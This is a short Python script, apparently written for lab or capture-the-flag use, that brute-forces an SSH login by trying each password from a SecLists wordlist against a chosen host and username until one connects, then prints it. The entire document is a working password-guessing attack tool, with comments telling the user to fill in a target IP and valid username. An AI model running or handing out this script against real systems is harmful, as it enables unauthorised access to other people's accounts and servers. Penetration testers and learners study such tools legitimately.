from pwn import *
import paramiko


host="127.0.0.1"  # change this to your target ip
username="kali"   # change this to a valid username
attempts=0


with open("/usr/share/wordlists/SecLists/Passwords/xato-net-10-million-passwords-100.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'!".format(attempts,password))
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connect():
                print("[>] Valid password found: '{}'!".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print({"[X] Invalid Password!"})
            attempts+=1
